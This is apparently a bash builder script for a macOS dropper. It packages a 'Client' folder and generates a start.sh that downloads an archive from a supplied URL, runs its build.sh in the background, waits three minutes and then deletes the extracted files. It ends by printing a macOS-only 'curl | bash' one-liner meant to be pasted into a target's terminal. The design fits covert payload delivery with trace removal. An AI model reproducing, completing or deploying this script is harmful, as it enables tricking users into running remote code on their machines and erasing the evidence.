#!/bin/bash

echo "Enter URL to ZIP file:"
read ZIP_URL

if [ -z "$ZIP_URL" ]; then
  echo "ZIP URL not entered. Exiting."
  exit 1
fi

echo "Enter URL to start.sh:"
read START_URL

if [ -z "$START_URL" ]; then
  echo "start.sh URL not entered. Exiting."
  exit 1
fi

echo "Enter path to Client folder:"
read CLIENT_PATH

if [ -z "$CLIENT_PATH" ]; then
  echo "Client folder path not entered. Exiting."
  exit 1
fi

if [ ! -d "$CLIENT_PATH" ]; then
  echo "Folder not found at path: $CLIENT_PATH. Exiting."
  exit 1
fi

cp -r "$CLIENT_PATH" scr

rm -f scr/build.py
rm -f scr/start.sh
rm -rf scr/iconscollection

zip -r scr.zip scr > /dev/null

cat << EOF > start.sh
#!/bin/bash

curl -s -o scr.zip "$ZIP_URL" || exit 1

unzip -q scr.zip -d . || exit 1

if [ -d "scr" ]; then
  cd scr || exit 1
  if [ -f "build.sh" ]; then
    bash build.sh &
  else
    exit 1
  fi
else
  exit 1
fi

sleep 180

cd ..
rm -f scr/*

rm -f scr.zip

EOF

chmod +x start.sh

echo "Generation completed! start.sh created."
echo "Now upload start.sh to the server at URL: $START_URL"
echo "Ready command for terminal :"
echo 'if [[ "$OSTYPE" != "darwin"* ]]; then exit 1; fi; /bin/bash -c "$(curl -fsSL '"$START_URL"')"'